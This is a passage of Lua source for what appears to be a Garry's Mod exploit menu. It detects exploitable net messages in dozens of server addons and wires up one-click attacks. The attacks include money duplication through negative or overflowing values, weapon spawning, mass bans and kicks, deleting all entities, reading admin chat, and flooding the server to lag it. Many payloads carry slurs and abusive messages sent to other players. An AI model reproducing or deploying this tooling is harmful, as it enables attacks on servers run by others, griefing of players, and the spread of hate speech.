ECNotify("Starting")
if(LocalPlayer():getDarkRPVar("money")>=WEED_ITEMS.Items["Tools"]["bong"].price) then
net.Start("DoDealerDeliver")
net.WriteBool(true)
net.SendToServer()
end
end )
end

status = ValidNetString("sendDuelInfo")
if (status) then
ECPrint("Found Exploit: Duel NPC Exploit [sendDuelInfo]")
addExploit( "175","Duel NPC Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("sendDuelInfo")
net.WriteString(table.Random(player.GetAll()):Nick())
net.WriteString("xxdddd")
net.WriteString("1e+100")
net.WriteEntity(table.random(player.GetAll()):UserID())
net.WriteInt(3,3)
net.SendToServer()
end )
end

status = ValidNetString("InviteMember")
if (status) then
ECPrint("Found Exploit: Invite all players [InviteMember]")
addExploit( "176","Invite all players", "Invite all players to your org", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("InviteMember")
net.WriteEntity(v)
net.WriteEntity(v)
net.WriteString("lol what")            
net.SendToServer()
end
end )
end

status = ValidNetString("newTerritory")
if (status) then
ECPrint("Found Exploit: New Territory [newTerritory]")
addExploit( "177","New Territory", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("newTerritory")
net.WriteString("Hackers")
net.WriteTable(t)
net.SendToServer()
end
end )
end

status = ValidNetString("CreateOrganization")
if (status) then
ECPrint("Found Exploit: Org Exploit [CreateOrganization]")
addExploit( "178","Org Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("CreateOrganization")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString( "Join my gang or will rekt u" )
net.SendToServer()
end
end )
end

status = ValidNetString("DisbandOrganization")
if (status) then
ECPrint("Found Exploit: Org Disband [DisbandOrganization]")
addExploit( "179","Org Disband", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("DisbandOrganization")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("ChangeOrgName")
if (status) then
ECPrint("Found Exploit: Org Change Name [ChangeOrgName]")
addExploit( "180","Org Change Name", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ChangeOrgName")
net.WriteString("I LOVE BANNAS WOOOOOOOOO I FUCKED GIANT BABIES WOOOOOO")
net.WriteString("SHITTY CUNT ASS SERVER FUCK OFF. STOP WITH YOUR SHITTY COPY AND PASTE SHIT! YOU STOLE MY SHIT NIGGER!")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("IS_SubmitSID_C2S")
if (status) then
ECPrint("Found Exploit: Free Reward [IS_SubmitSID_C2S | IS_GetReward_C2S]")
addExploit( "181","Free Reward", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("IS_SubmitSID_C2S")
net.WriteString("Killa")
net.SendToServer()
net.Start("IS_GetReward_C2S")
net.SendToServer()
end )
end

status = ValidNetString("AcceptBailOffer")
if (status) then
ECPrint("Found Exploit: Bail Offer Exploit [AcceptBailOffer]")
addExploit( "182","Bail Offer Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("AcceptBailOffer")
net.WriteEntity(v)
net.WriteUInt(-100000000000000000, 16 )
net.SendToServer()
end
end )
end

status = ValidNetString("CP_Test_Results")
if (status) then
ECPrint("Found Exploit: CP Bypass [CP_Test_Results]")
addExploit( "183","CP Bypass", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("CP_Test_Results")
net.WriteInt(1 ,8)
net.SendToServer()
end )
end

status = ValidNetString("ReSpawn")
if (status) then
ECPrint("Found Exploit: Respawn #4 [ReSpawn]")
addExploit( "184","Respawn #4", "just respawn", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ReSpawn")
net.SendToServer()
end )
end

status = ValidNetString("FIGHTCLUB_KickPlayer")
if (status) then
ECPrint("Found Exploit: Fight Club Kick [FIGHTCLUB_KickPlayer]")
addExploit( "185","Fight Club Kick", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("FIGHTCLUB_KickPlayer")
net.WriteBit(v)
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("FIGHTCLUB_StartFight")
if (status) then
ECPrint("Found Exploit: Fight Club Start Fight [FIGHTCLUB_StartFight]")
addExploit( "186","Fight Club Start Fight", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("FIGHTCLUB_StartFight")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("IveBeenRDMed")
if (status) then
ECPrint("Found Exploit: Fake RDM [IveBeenRDMed]")
addExploit( "187","Fake RDM", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("IveBeenRDMed")                              
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("nCTieUpStart")
if (status) then
ECPrint("Found Exploit: Combine Control Exploit [nCTieUpStart]")
addExploit( "188","Combine Control Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
net.Start("nCTieUpStart")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.SendToServer()
end
end )
end

status = ValidNetString("DestroyTable")
if (status) then
ECPrint("Found Exploit: Fuck All [DestroyTable]")
addExploit( "189","Fuck All", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
net.Start("DestroyTable")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("start_wd_hack")
if (status) then
ECPrint("Found Exploit: Hack Phone Exploit [start_wd_hack]")
addExploit( "190","Hack Phone Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("start_wd_hack")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.SendToServer()
end )
end

status = ValidNetString("bringNfreeze")
if (status) then
ECPrint("Found Exploit: Ban Exploit [bringNfreeze]")
addExploit( "191","Ban Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start('bringNfreeze')
net.WriteEntity(self)
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.SendToServer()
end
end )
end

status = ValidNetString("JoinFirstSS")
if (status) then
ECPrint("Found Exploit: Join First SS [JoinFirstSS]")
addExploit( "192","Join First SS", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("JoinFirstSS")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("unarrestPerson")
if (status) then
ECPrint("Found Exploit: Unarrest Person [unarrestPerson]")
addExploit( "193","Unarrest Person", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("unarrestPerson")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("giveArrestReason")
if (status) then
ECPrint("Found Exploit: Give Arrest Reason [giveArrestReason]")
addExploit( "194","Give Arrest Reason", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("giveArrestReason")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.WriteString("Faggot")
net.SendToServer()
end
end )
end

status = ValidNetString("sellitem")
if (status) then
ECPrint("Found Exploit: Free Money #24 [sellitem]")
addExploit( "195","Free Money #24", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("sellitem")
net.WriteString(self)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("createFaction")
if (status) then
ECPrint("Found Exploit: Create Faction [createFaction]")
addExploit( "196","Create Faction", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("createFaction")
net.WriteEntity(v)
net.WriteString("I FUCKED SO MANY BABIES TODAY WOOOOOOOOOOOOOOOOOOOOOOOO")
net.SendToServer()
end
end )
end

status = ValidNetString("inviteToOrganization")
if (status) then
ECPrint("Found Exploit: Faction Invite All [inviteToOrganization]")
addExploit( "197","Faction Invite All", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("inviteToOrganization")
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end

status = ValidNetString("GovStation_SpawnVehicle")
if (status) then
ECPrint("Found Exploit: Gov Spawn [GovStation_SpawnVehicle]")
addExploit( "198","Gov Spawn", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
net.Start("GovStation_SpawnVehicle")
net.WriteString("GOV_POLICE")
net.SendToServer()
end
end )
end

status = ValidNetString("GiveWeapon")
if (status) then
ECPrint("Found Exploit: Give Weapons #3 [GiveWeapon]")
addExploit( "199","Give Weapons #3", "get weapons", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("GiveWeapon")
net.WriteEntity(LocalPlayer())
net.WriteString("m9k_davy_crockett")
net.WriteFloat(0)
net.SendToServer()
end )
end

status = ValidNetString("DailyLoginClaim")
if (status) then
ECPrint("Found Exploit: Daily Login Reward [DailyLoginClaim]")
addExploit( "200","Daily Login Reward", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("DailyLoginClaim")
net.SendToServer()
end )
end

status = ValidNetString("DL_AskLogsList")
if (status) then
ECPrint("Found Exploit: Ask Log List [DL_AskLogsList]")
addExploit( "201","Ask Log List", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("DL_AskLogsList")
net.SendToServer()
end )
end

status = ValidNetString("DL_StartReport")
if (status) then
ECPrint("Found Exploit: DL Report All [DL_StartReport | DL_ReportPlayer]")
addExploit( "202","DL Report All", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("DL_StartReport")
net.SendToServer()
net.Start("DL_ReportPlayer")
net.WriteEntity(v)
net.WriteString("Hes being a gay faggot plz ban him")
net.SendToServer()
end
end )
end

status = ValidNetString("sv_saveweapons")
if (status) then
ECPrint("Found Exploit: TTT Weapons Exploit [sv_saveweapons]")
addExploit( "203","DL Report All", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("sv_saveweapons")
net.WriteString("weapon_ttt_rpg")
net.WriteString("weapon_ttt_rpg")
net.WriteString("eg")
net.SendToServer()
end )
end

status = ValidNetString("SpecDM_SendLoadout")
if (status) then
ECPrint("Found Exploit: SpecDM Exploit [SpecDM_SendLoadout]")
addExploit( "204","SpecDM Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("SpecDM_SendLoadout")
net.WriteString("eg")
net.WriteString("weapon_ttt_defib")
net.SendToServer()
end )
end

status = ValidNetString("PowerRoundsForcePR")
if (status) then
ECPrint("Found Exploit: Power Rounds Force [PowerRoundsForcePR]")
addExploit( "205","Power Rounds Force", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("PowerRoundsForcePR")
net.SendToServer()
end )
end

status = ValidNetString("wyozimc_playply")
if (status) then
ECPrint("Found Exploit: Wyozimc Music Exploit [wyozimc_playply]")
addExploit( "206","Wyozimc Music Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("wyozimc_playply")
net.WriteEntity(v)
net.WriteString("https://www.youtube.com/watch?v=2fSeiKs6MYY")
net.SendToServer()
end
end )
end

status = ValidNetString("SendSteamID")
if (status) then
ECPrint("Found Exploit: Send Mail's [SendSteamID]")
addExploit( "207","Send Mail's", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("SendSteamID")
net.WriteEntity(v)
net.WriteString("Faggot")
net.WriteString("Faggot")
net.SendToServer()
end
end )
end

status = ValidNetString("JB_GiveCubics")
if (status) then
ECPrint("Found Exploit: Give Cubics All [JB_GiveCubics]")
addExploit( "208","Give Cubics All", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("JB_GiveCubics")
net.WriteEntity(v)
net.WriteInt(math.floor(dwang:GetValue()), 255)
net.SendToServer()
end
end )
end

status = ValidNetString("JB_SelectWarden")
if (status) then
ECPrint("Found Exploit: Select Warden All [JB_SelectWarden]")
addExploit( "209","Select Warden All", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("JB_SelectWarden")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("RDMReason_Explain")
if (status) then
ECPrint("Found Exploit: RDM Explain [RDMReason_Explain]")
addExploit( "210","RDM Explain", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("RDMReason_Explain")
net.WriteTable({id=v, reason=fgt})
net.SendToServer()
end
end )
end

status = ValidNetString("redirectMsg")
if (status) then
ECPrint("Found Exploit: Redirect Message [redirectMsg]")
addExploit( "211","Redirect Message", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("redirectMsg")
net.WriteString("Fuck you! YOUR ALL FAGGOTS!")
net.SendToServer()
end )
end

status = ValidNetString("LB_AddBan")
if (status) then
ECPrint("Found Exploit: LB Ban [LB_AddBan]")
addExploit( "212","LB Ban", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("LB_AddBan")
net.WriteString("STEAM_0:0:71238382")
net.WriteString("fgt")
net.SendToServer()
end
end
end )
end

status = ValidNetString("GET_Admin_MSGS")
if (status) then
ECPrint("Found Exploit: Brass Admin Chat [GET_Admin_MSGS | OPEN_ADMIN_CHAT]")
addExploit( "213","Brass Admin Chat", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("GET_Admin_MSGS")
net.SendToServer()
net.Start("OPEN_ADMIN_CHAT")
net.SendToServer()
end )
end

status = ValidNetString("br_send_pm")
if (status) then
ECPrint("Found Exploit: Brass Email Send All [br_send_pm]")
addExploit( "214","Brass Email Send All", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("br_send_pm")
net.WriteString(v)
net.WriteString("FGT")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("LAWYER.BailFelonOut")
if (status) then
ECPrint("Found Exploit: Bail Felon Out [LAWYER.BailFelonOut]")
addExploit( "215","Bail Felon Out", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("LAWYER.BailFelonOut")
net.WriteString("1")
net.WriteString("fgt")
net.SendToServer()
end )
end

status = ValidNetString("LAWYER.GetBailOut")
if (status) then
ECPrint("Found Exploit: Get Bail Out [LAWYER.GetBailOut]")
addExploit( "216","Get Bail Out", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("LAWYER.GetBailOut")
net.WriteString("Mick")
net.WriteString("Mick")
net.WriteString("1000000")
net.SendToServer()
end )
end

status = ValidNetString("GrabMoney")
if (status) then
ECPrint("Found Exploit: Get Bail Out [GrabMoney]")
addExploit( "217","Get Bail Out", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
if v:GetClass() == "gold" then
if v:GetClass() == "silver" then
if v:GetClass() == "vip" then
if v:GetClass() == "vipgold" then
net.Start("GrabMoney")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end
end
end
end )
end

status = ValidNetString("nox_addpremadepunishment")
if (status) then
ECPrint("Found Exploit: Nox Ban [nox_addpremadepunishment]")
addExploit( "218","Nox Ban", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("nox_addpremadepunishment")
net.WriteEntity("Sun")
net.WriteUInt(2, 8)
net.SendToServer()
end
end
end )
end

status = ValidNetString("NET_CR_TakeStoredMoney")
if (status) then
ECPrint("Found Exploit: Steal Registry Money [NET_CR_TakeStoredMoney]")
addExploit( "219","Steal Registry Money", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
if v:GetClass() == "ss_cash_registry" then
net.Start('NET_CR_TakeStoredMoney')
net.WriteEntity("ss_cash_registry")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end )
end

status = ValidNetString("HV_AmmoBuy")
if (status) then
ECPrint("Found Exploit: HV Free Ammo [HV_AmmoBuy]")
addExploit( "220","HV Free Ammo", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("HV_AmmoBuy")
net.WriteFloat("2")
net.SendToServer()
net.Start("HV_AmmoBuy")
net.WriteFloat("1")
net.SendToServer()
end )
end

status = ValidNetString("hitcomplete")
if (status) then
ECPrint("Found Exploit: Super RP Hit [hitcomplete]")
addExploit( "221","Super RP Hit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("hitcomplete")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("SyncRemoveAction")
if (status) then
ECPrint("Found Exploit: Remove All [SyncRemoveAction]")
addExploit( "222","Remove All", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
net.Start("SyncRemoveAction")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("TMC_NET_MakePlayerWanted")
if (status) then
ECPrint("Found Exploit: Make All Wanted [TMC_NET_MakePlayerWanted]")
addExploit( "223","Make All Wanted", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("TMC_NET_MakePlayerWanted")
net.WriteString("bad")
net.WriteString("bad")
net.SendToServer()
end
end )
end

status = ValidNetString("thiefnpc")
if (status) then
ECPrint("Found Exploit: Thief NPC [thiefnpc]")
addExploit( "224","Thief NPC", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start('thiefnpc')
net.WriteDouble(-99999999999999999)  
net.SendToServer()
end )
end

status = ValidNetString("TMC_NET_FirePlayer")
if (status) then
ECPrint("Found Exploit: Fire Player [TMC_NET_FirePlayer]")
addExploit( "225","Fire Player", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("TMC_NET_FirePlayer")
net.WriteString("Paypal")
net.SendToServer()
end )
end

status = ValidNetString("updateLaws")
if (status) then
ECPrint("Found Exploit: Update Laws [updateLaws]")
addExploit( "226","Update Laws", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("updateLaws")
net.WriteString("Bitch")
net.SendToServer()
end )
end

status = ValidNetString("LotteryMenu")
if (status) then
ECPrint("Found Exploit: Free Money #25 [LotteryMenu]")
addExploit( "227","Free Money #25", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("LotteryMenu")
net.WriteEntity(LocalPlayer())
net.WriteInt(1000000000000000000, 16)
net.SendToServer()
end )
end

status = ValidNetString("soundArrestCommit")
if (status) then
ECPrint("Found Exploit: Sound Arrest [soundArrestCommit]")
addExploit( "228","Sound Arrest", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("soundArrestCommit")
net.WriteString("Shit")
net.SendToServer()
end )
end

status = ValidNetString("hoverboardpurchase")
if (status) then
ECPrint("Found Exploit: Hover Board [hoverboardpurchase]")
addExploit( "229","Hover Board", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("hoverboardpurchase")
net.WriteInt(8, 32)
net.SendToServer()
end )
end

status = ValidNetString("SpawnProtection")
if (status) then
ECPrint("Found Exploit: Off Spawn Protection [SpawnProtection]")
addExploit( "230","Off Spawn Protection", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("SpawnProtection")
net.WriteFloat(0)
net.SendToServer()
end )
end

status = ValidNetString("NPCShop_BuyItem")
if (status) then
ECPrint("Found Exploit: NPC Shop [NPCShop_BuyItem]")
addExploit( "231","NPC Shop", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("NPCShop_BuyItem")
net.WriteString("weapon_hack_phone")
net.SendToServer()
end )
end

status = ValidNetString("CubeRiot CaptureZone Update")
if (status) then
ECPrint("Found Exploit: CubeRiot Exploit [CubeRiot CaptureZone Update]")
addExploit( "232","CubeRiot Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("CubeRiot CaptureZone Update")
net.WriteUInt( 1, 8 )
net.WriteVector( "2654.989258 2254.119629 -139.968750" )
net.WriteVector( "2654.989258 2254.119629 -139.968750" )
net.SendToServer()
end )
end

status = ValidNetString("deposit")
if (status) then
ECPrint("Found Exploit: Free Money #26 [deposit]")
addExploit( "233","Free Money #26", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("deposit")
net.WriteString("-10000000000000000000000")
net.SendToServer()
end )
end

status = ValidNetString("AcceptRequest")
if (status) then
ECPrint("Found Exploit: Call Exploit [AcceptRequest]")
addExploit( "234","Call Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("AcceptRequest")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("Chess ClientWager")
if (status) then
ECPrint("Found Exploit: Chess Exploit [Chess ClientWager | Chess ClientResign]")
addExploit( "235","Chess Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("Chess ClientWager")
net.WriteUInt( -999999999999999999999999999, 24 )
net.SendToServer()
net.Start("Chess ClientResign") 
net.SendToServer()
end )
end

status = ValidNetString("netOrgVoteInvite_Server")
if (status) then
ECPrint("Found Exploit: Org Invite All [netOrgVoteInvite_Server]")
addExploit( "236","Org Invite All", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("netOrgVoteInvite_Server")
net.WriteEntity(v)
net.SendToServer()
end
end )
end


status = ValidNetString("donatorshop_itemtobuy")
if (status) then
ECPrint("Found Exploit: Donator Box Exploit [donatorshop_itemtobuy]")
addExploit( "237","Donator Box Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("donatorshop_itemtobuy")
net.WriteString("DonatorShopBuyTripwire")
net.SendToServer()
end )
end

status = ValidNetString("AskPickupItemInv")
if (status) then
ECPrint("Found Exploit: Ask Item [AskPickupItemInv]")
addExploit( "238","Ask Item", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("AskPickupItemInv")
net.WriteUInt(4,16)
net.WriteUInt(1,16)
net.SendToServer()
end
end )
end

status = ValidNetString("buy_bundle")
if (status) then
ECPrint("Found Exploit: Buy Bundle [buy_bundle]")
addExploit( "239","Buy Bundle", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("buy_bundle")
net.WriteFloat(1, 16)
net.SendToServer()
end )
end

status = ValidNetString("LawyerOfferBail")
if (status) then
ECPrint("Found Exploit: Lawyer Off Bail [LawyerOfferBail | AcceptBailOffer]")
addExploit( "240","Lawyer Off Bail", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("LawyerOfferBail")
net.WriteEntity(v)
net.WriteUInt(-100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 16)
net.SendToServer()
net.Start("AcceptBailOffer")
net.WriteEntity(v)
net.WriteUInt(-10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 16)
net.SendToServer()            
end
end )
end

status = ValidNetString("MineServer")
if (status) then
ECPrint("Found Exploit: Lagger #22 [MineServer]")
addExploit( "241","Lagger #22", "lags", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for i = 0, 100 do
for k,v in pairs(player.GetAll()) do
net.Start("MineServer",true)
net.WriteString("sell")
net.WriteEntity(v)
net.WriteString("Fuck you. Gonna ddos this shitty ass server niggers")
net.SendToServer()
end
end
end )
end

status = ValidNetString("Gb_gasstation_BuyGas")
if (status) then
ECPrint("Found Exploit: Ukrainian gas [Gb_gasstation_BuyGas | Gb_gasstation_BuyJerrycan]")
addExploit( "242","Ukrainian gas", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("Gb_gasstation_BuyGas")
net.SendToServer()
net.Start("Gb_gasstation_BuyJerrycan")
net.SendToServer()
end )
end

status = ValidNetString("D3A_CreateOrg")
if (status) then
ECPrint("Found Exploit: D3A Create Org [D3A_CreateOrg]")
addExploit( "243","D3A Create Org", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("D3A_CreateOrg")
net.WriteString('969690485273489312467812367128312312314')
net.WriteString('123712983712984571298712398')
net.WriteString("255 255 255")
net.SendToServer()
end )
end

status = ValidNetString("Shop_buy")
if (status) then
ECPrint("Found Exploit: SUP Buy Armor [Shop_buy]")
addExploit( "244","SUP Buy Armor", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("Shop_buy")
net.WriteString("Armor")
net.SendToServer()
end )
end

status = ValidNetString("LawsToServer")
if (status) then
ECPrint("Found Exploit: SUP New Laws [LawsToServer]")
addExploit( "245","SUP New Laws", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("LawsToServer")
net.WriteString("FAGGOTS")
net.SendToServer()
end )
end

status = ValidNetString("D3A_Message")
if (status) then
ECPrint("Found Exploit: D3A Message [D3A_Message]")
addExploit( "246","D3A Message", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
local stuff = {
    
}
net.Start("D3A_Message")
net.WriteString("FAGGOTS")
net.WriteTable(stuff)
net.SendToServer()
end )
end

status = ValidNetString("misswd_accept")
if (status) then
ECPrint("Found Exploit: Misswd Accept [misswd_accept]")
addExploit( "247","Misswd Accept", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
for i = 0, 100 do
net.Start("misswd_accept")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("ScannerMenu")
if (status) then
ECPrint("Found Exploit: Scanner Exploit [ScannerMenu]")
addExploit( "248","Scanner Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("ScannerMenu")
net.WriteEntity(v)
net.WriteFloat(1)
net.WriteFloat(1)
net.SendToServer()
end
end )
end

status = ValidNetString("ORG_NewOrg")
if (status) then
ECPrint("Found Exploit: New ORG [ORG_NewOrg]")
addExploit( "249","New ORG", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ORG_NewOrg")
net.WriteString("I FUCKING HATE YOU!")
net.SendToServer()
end )
end

status = ValidNetString("ORG_VaultDonate")
if (status) then
ECPrint("Found Exploit: Free Money #27 [ORG_VaultDonate]")
addExploit( "250","Free Money #27", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ORG_VaultDonate")
net.WriteFloat(-1000000000000000000000000000000000000000000000000000000)
net.SendToServer()
end )
end

status = ValidNetString("Selldatride")
if (status) then
ECPrint("Found Exploit: Sell Datride [Selldatride]")
addExploit( "251","Sell Datride", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("Selldatride")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("passmayorexam")
if (status) then
ECPrint("Found Exploit: Passexam Exploit [passmayorexam]")
addExploit( "252","Passexam Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("passmayorexam")
net.SendToServer()
end )
end

status = ValidNetString("levelup_useperk")
if (status) then
ECPrint("Found Exploit: LevelUp Exploit [levelup_useperk]")
addExploit( "253","LevelUp Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("levelup_useperk")
net.WriteInt(1, 8)
net.WriteInt(2, 8)
net.WriteInt(3, 8)
net.WriteInt(4, 8)
net.SendToServer()
end )
end

